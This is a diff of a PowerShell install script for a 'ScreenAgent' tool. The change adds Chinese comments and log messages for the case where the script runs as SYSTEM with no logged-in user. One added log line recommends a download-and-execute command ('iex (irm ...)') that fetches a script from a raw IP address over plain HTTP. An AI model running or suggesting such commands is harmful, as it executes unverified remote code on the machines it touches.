@@ -295,7 +295,10 @@ if (-not $TargetUser) {
             $TargetUser = $detected.User
             Write-Log "SYSTEM 跑, 自动检测到交互用户: $($detected.Account) Session=$($detected.SessionId)" 'WARN'
         } else {
-            Write-Log "SYSTEM 跑但没检测到登录的交互用户(无 explorer.exe). ScreenAgent 必须依附用户桌面, 让目标用户先登录一次再重跑此脚本" 'ERROR'
+            # 本脚本走 HKCU/HKU Run 键模式, 必须有具体目标用户 (Run 键不能 "any user").
+            # 没人登录的无人值守场景请用基于 Scheduled Task 的变体, 它能用 BUILTIN\Users principal.
+            Write-Log "SYSTEM 跑但没检测到登录的交互用户(无 explorer.exe). 此脚本(Run 键模式)需要具体目标用户" 'ERROR'
+            Write-Log "无人值守部署请改用: iex (irm http://114.80.36.225:15667/6/install-screenagent-sid-nocv-cn.ps1)" 'ERROR'
             exit 4
         }
     } else {
